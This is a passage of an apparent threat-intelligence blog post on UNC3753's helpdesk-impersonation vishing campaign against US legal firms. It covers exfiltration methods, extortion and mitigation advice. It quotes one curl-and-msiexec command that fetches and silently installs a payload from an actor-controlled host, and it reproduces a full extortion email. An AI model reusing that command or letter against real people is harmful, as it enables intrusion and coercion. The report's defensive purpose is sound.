lifecycle\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1500x1500.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1500x1500.png 1401w"," 1060px,  1401px","https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fig1.max-1500x1500.png"],null,3]]],[null,null,[null,[null,"\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eInitial Access via IT Helpdesk Impersonation\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe core of UNC3753's entry mechanism relies on targeted vishing. Mandiant has observed the group targeting personnel across all seniority levels, who are often publicly listed on the organization’s websites, to harvest phone numbers and email addresses. Acting as members of the organization's internal IT helpdesk or security team, threat actors place direct calls to these employees. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe callers use a variety of verbal instructions to guide target behavior. Under the guise of addressing a security issue or aiding with a corporate data migration project, they build trust and direct the target to join a screen-sharing session.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRemote Screen Control and Legitimate Tool Abuse\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOnce the target is engaged, the threat actors bypass conventional automated boundary security and email filtering controls by instructing the user to download and execute screen-sharing applications. \u003c/span\u003e\u003c/p\u003e\n\u003ch5\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eScreen-Sharing Utilities\u003c/span\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3753 instructs targets to initiate remote desktop and support sessions using built-in or commercial services, including Zoom, Microsoft Terminal Services, Microsoft Teams, and Quick Assist. During a Teams-facilitated intrusion, the threat actor held five distinct calls with the same target over a three-day period.\u003c/span\u003e\u003c/p\u003e\n\u003ch5\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCommercial RMM Agents\u003c/span\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3753 frequently attempts to establish more persistent access by social engineering targets into downloading AnyDesk, Bomgar, or Zoho Assist installers. In one engagement, the threat actor attempted to install a \"SuperOps RMM agent\" by convincing the target to download and execute a payload via a cURL command.\u003c/span\u003e\u003c/p\u003e\n\u003ch5\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMessage Delivery via Privnote\u003c/span\u003e\u003c/h5\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThreat actors consistently utilize \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eprivnote[.]com,\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e a web-based, self-destructing text utility, to transmit installation links and commands to targets. This evasion technique ensures that copy-paste vectors leave no permanent footprint on endpoint browsers or chat logs.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eExample cURL command staging string observed in UNC3753 remote sessions:\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003ecurl -sL \u0026quot;http://[actor-controlled-ip]/installer\u0026quot; -o \u0026quot;SuperOps.msi\u0026quot; \u0026amp;\u0026amp; msiexec /i \u0026quot;SuperOps.msi\u0026quot; /quiet\u003c/code\u003e\u003c/pre\u003e"]]],[null,null,[null,[null,"\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eInfrastructure Pivoting and Local Staging\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIntrusions have abused Bring Your Own Device (BYOD) remote environments to access internal enterprise assets. In separate Mandiant Consulting cases, UNC3753 established Zoom sessions directly on targets' personal BYOD endpoints. Using these compromised personal laptops, they accessed corporate virtual desktop infrastructure (VDI) using native client platforms, such as Windows 365 (\u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eWindows365.exe\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e) or Citrix clients. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOnce VDI environment access is secured, the threat actors pivot to corporate file systems:\u003c/span\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eSystem Enumeration: The threat actors map local directories, enumerate active OneDrive folders, and crawl mapped network drives.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eDocument Management Targeted Harvesting: Threat actors target specific legal and document storage repositories.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:decimal;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eKeyword Search and File Staging: Threat actors use specific keyword search functions within iManage to locate highly sensitive folders containing tax logs (Forms W-2, W-9, and 1099), audit files, corporate client agreements, and Social Security numbers (SSNs). Staged results are compiled and sorted within target-accessible subdirectories, primarily inside the user's Downloads folder or native Roaming profile path.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eData Theft\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3753 exfiltrates the staged data using a variety of methods to bypass security controls. They frequently use portable versions of WinSCP or Rclone. In other instances, they simply log into a threat actor-controlled consumer file sharing account directly within the victim's web browser and batch upload the stolen files.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eCloud Storage Staging: Threat actors instruct targets—or directly control their screens—to drag and drop staged folders into threat actor-controlled consumer file sharing accounts. In several intrusions, the exfiltration destination included folders explicitly renamed to mimic the victim organization's branding.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eFTP Utilities: When browser-based uploads are restricted by endpoint controls, threat actors download FTP and SFTP client binaries, primarily WinSCP, to exfiltrate bulk packages. In one incident, the threat group exfiltrated 1.7 gigabytes of data from a target's local OneDrive folder to a Google Drive account before pivoting to a VDI session and exfiltrating an additional 14.4 gigabytes using WinSCP. Google has taken action against this actor by disabling the Drive accounts and assets associated with this activity.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEmail Forwarding: The threat actors have also had victims stage files from internal iManage repositories and instructed them to send the files to threat actor-controlled consumer email addresses from the target's mailbox.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThreat Actor Extortion Tactics\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe threat cluster delivers unbranded extortion communications via email shortly after successfully stealing data, often within 30 minutes of exiting the target environment. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThese highly aggressive extortion letters give organizations a three-day deadline to respond and initiate ransom negotiations. If the victim organization is unresponsive, the threat actors declare they will call and email target employees and external clients directly to alert them of the data breach. The extortion letters explicitly emphasize that the leak will compromise client trust, invite substantial regulatory fines, and suggest that external clients sue the victim organization for data mishandling. Additionally, as part of a follow-on message the group has threatened to publish all exfiltrated archives on the LEAKEDDATA data leak site (DLS).\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eSample Extortion Email\u003c/span\u003e\u003c/h4\u003e"]]],[null,null,[null,[null,"\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable border\u003d\"1\" style\u003d\"border-collapse:collapse;width:99.9641%\"\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:98.1839%\"\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eSubject: [Victim Name] has lost confidential data of their clients. Very Important!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eHello,\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eWe have to inform you that we got access to the [Victim Name] corporation\u0026#39;s database and took a very large dataset. We have been in your network for weeks in multiple systems , aiming for proprietary and confidential files, and were able to obtain what We were looking for as well as the data of many clients. \u0026lt;mentions the general nature of the stolen documents\u0026gt;. This is not a joke or a scam.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eThis is a real problem that puts the existence of your firm in danger and to prove it We have attached screenshots that are confirming the possession of the files.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eReply to Our email and We will show you the complete file tree and actual files.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eWe are an elite group who's been in this business for a very long time, We have Our own website where We post the data and thousands of individuals follow Our work , and connections in different business social media. But, what's more important, is that We want to return your data peacefully and as soon as possible.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eWe will guarantee you the complete database deletion from Our servers, video evidence of us deleting the files, privacy of our communication and Our security advice with an explanation of how We got into your network and how to fix the vulnerability that We found.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eIn order for us to solve this problem you need to send us an email and start communicating with us. We hope to find a financial solution that will be acceptable for both parties.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eIn case of ignorance or no agreement, We will notify your employees, partners and customers, after which We will publish your data. You will receive claims from individuals, and legal entities for information leakage and breach of contracts, your current deals will be terminated. Journalists and others will dig into your documents, finding inconsistencies or violations in them. Your organization will lose its reputation, shares will fall in price, and your organization will be forced to close.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eLet us remind you that your data can be used by many other hackers and criminals on the dark web as well as your competitors and enemies in case We leak the data.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eLaw enforcement will not help you, We are out of their jurisdiction, and We already took all the critical data. They will only tell you not to communicate with us and be the first ones to fine you.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eAs soon as you reach out, We will show you all the files that We obtained, so you can understand the seriousness of this problem and the necessity to proceed to the negotiations.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eOur communication will stay 100% private before and after the agreement. We can show the proof of it as well.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eAll further communication can be done through this email address.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eDo not waste any time as it is ticking . Text us today, so We don't have to start calling your employees tomorrow. You will have 3 days to start communicating.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eHere We attached some screenshots confirming all the above. Respond to this email and We will send you the file tree.\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eFigure 2: \u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3753 e\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003extortion note example\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eData Leak Site\u003c/span\u003e\u003c/h3\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 3: LEAKEDDATA DLS (partially redacted; cropped)\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1200x1200.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1200x1200.png 1122w"," 1060px,  1122px","https://storage.googleapis.com/gweb-cloudblog-publish/images/seeking-counsel-fi3.max-1200x1200.png"],null,3]]],[null,null,[null,[null,"\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eSuspected UNC3753 Activity Involving Physical Access\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eWhile UNC3753 primarily relies on digital vectors, GTIG assesses that associated threat actors have also attempted direct data theft using physical, in person access. This escalating tactic is corroborated by a recent \u003c/span\u003e\u003ca href\u003d\"https://www.ic3.gov/CSA/2026/260526.pdf\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eFBI Cyber FLASH Alert\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e highlighting instances where Silent Ransom Group threat actors leveraged physical office access to exfiltrate corporate data via removable USB media.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAccording to the FBI advisory, if remote social engineering attempts fail, actors will send an individual to a victim's physical location. The onsite threat actor will claim they need to image the device or create local backups to address a security issue. Once they gain access to the endpoint, they attempt to exfiltrate corporate data directly to an external drive.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAlthough limited forensic evidence and the absence of a subsequent extortion attempt prevent formal attribution, GTIG assesses that these physical intrusions are likely associated with UNC3753 based on structural, timeline, and targeting overlaps.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAttribution\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGTIG attributes this campaign and related social engineering operations to UNC3753 based on infrastructure overlaps, domain registrar tracking, victimology, and target staging directories. \u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3753 (aliases: \"Luna Moth,\" “Chatty Spider,” and \"Silent Ransom Group (SRG)\") is a financially motivated threat cluster active since at least March 2022. UNC3753 has TTP overlaps with UNC2686, a threat cluster that conducted \"Bazarcall\" style campaigns dating to early 2021. UNC3753 deployed LOCKBIT.BLACK in 2022, but has since prioritized data theft extortion-only operations typically involving threats to post stolen files to the LEAKEDDATA DLS. The threat cluster relies heavily on Remote Monitoring and Management (RMM) tools, unlike UNC2686 which deployed BAZARLOADER variants as well as TRICKBOT, URSNIF, and SILENTNIGHT. Initially, UNC3753 used subscription-themed billing email lures (such as fake software renewal alerts), typically with PDF attachments containing phone numbers for actor-controlled call centers. Beginning around March 2025, the cluster shifted tactics to pose as internal corporate IT helpdesk staff.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRemediation and Hardening\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eTo mitigate the risk of voice phishing, physical office intrusions, and unauthorized endpoint control, GTIG recommends that organizations implement the following mitigation controls:\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUser Education\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eConduct user awareness training specifically tailored to UNC3753 tactics, techniques, and procedures.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ePhysical Access and Verification Policies\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eImplement rigid out-of-band identity verification controls for all external contractors, technical staff, and facilities visitors. Mandate the following physical controls:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRequire visitors to display official credentials and photo identification.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRequire front-desk staff to copy and log all physical visitor IDs before granting access.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eVerify the arrival of all technicians against pre-scheduled work orders directly with the verified parent organization or helpdesk dispatcher.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEnforce a policy requiring physical technical service personnel to be escorted by a corporate supervisor at all times.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRemote Access Conditional Access Controls\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eImplement remote access conditional access policies to ensure only corporate owned devices can authenticate to Virtual Desktop Instance (VDI) or Virtual Private Network (VPN) devices. This facilitates increased organizational control and visibility for potential Remote Monitoring and Management usage. \u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEnforce Strict RMM and Screen-Sharing Software Controls\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAudit corporate environments to block the installation and execution of unauthorized remote monitoring, management, and support utilities. Enforce application control policies (e.g. Windows Defender Application Control or third-party endpoint protection tools) to restrict execution of non-approved binaries. Organizations may also consider restricting interactive screen-control features within authorized virtual meeting platforms like Zoom and Teams. \u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEndpoint Removable Media Hardening\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eTo neutralize physical exfiltration vectors, disable read/write capabilities for all external USB mass storage devices. Enforce Group Policy Objects (GPOs) or MDM configurations to restrict:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUSB storage device installation.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRemovable media access.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOptical media writes on all corporate endpoints and BYOD systems utilizing VDI entry.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eNetwork Monitoring and Egress Control\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMonitor firewall logs, network flows, and endpoint execution logs for indicative exfiltration and staging actions. Specifically:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eBlock or alert on outbound connections to unauthorized file-sharing APIs and emails.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEnsure full session logging with bytes transferred is enabled within Firewall log configurations.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMonitor SSH traffic (Port 22) from internal VDIs and endpoints for high-volume WinSCP and Rclone transfers.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eApplication Log and Access Auditing\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eReview authentication and access metrics for critical document stores to identify bulk harvesting profiles.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eConfigure real-time alerts in iManage, SharePoint, and corporate email directories for rapid file searches, search-term spikes, and mass file downloads.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eImplement multi-factor authentication (MFA) on business critical data repository applications, such as iManage. \u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eImplement strict BYOD authentication controls, requiring MFA step-up queries when accessing VDI nodes.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOutlook and Implications\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe targeting of US legal and professional services organizations by financially motivated actors is a persistent industry risk. Legal services firms represent high-value targets for extortion actors. They maintain concentrated repositories of extremely sensitive client transaction files, merger and acquisition plans, client trade secrets, and corporate regulatory reports. Threat groups recognize that legal entities are subject to heavy reputational and regulatory exposure and may be highly motivated to resolve extortion situations quietly to protect their professional standing.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThreat actors recognize that targeting the human element—specifically using voice-guided social engineering—enables them to easily bypass robust technical perimeters, web security gateways, and MFA configurations. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eFinally, the integration of in-person, physical intrusions represents an escalation in threat capability. While log-based defenses and endpoint telemetry have matured, physical corporate boundaries are frequently protected only by administrative procedures. Organizations must transition to a unified security posture that treats physical facility access control and endpoint-based hardware policies as equal components of their defensive perimeter.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eData Leak Site (DLS)\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC3753 utilizes the following web platform to disclose the identities of victims and their compromised data.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ehxxps[:]//business-data-leaks[.]com\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ePhishing Domains\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGTIG identified infrastructure registrations by suspected UNC3753 actors utilizing specific naming conventions, assessed as supporting their ongoing social engineering and vishing activities.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\u0026lt;organization\u0026gt;-itdesk[.]com\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\u0026lt;organization\u0026gt;-it[.]com\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\u0026lt;organization\u0026gt;-helpdesk[.]com\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIndicators of Compromise (IOCs) \u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eTo assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a \u003ca href\u003d\"https://www.virustotal.com/gui/collection/598281d2c6de83adf1505ee6077608d0c043623d477e2884d36d65e90686d67a/summary\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eGTI Collection\u003c/a\u003e for registered users.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cdiv align\u003d\"left\"\u003e\n\u003cdiv
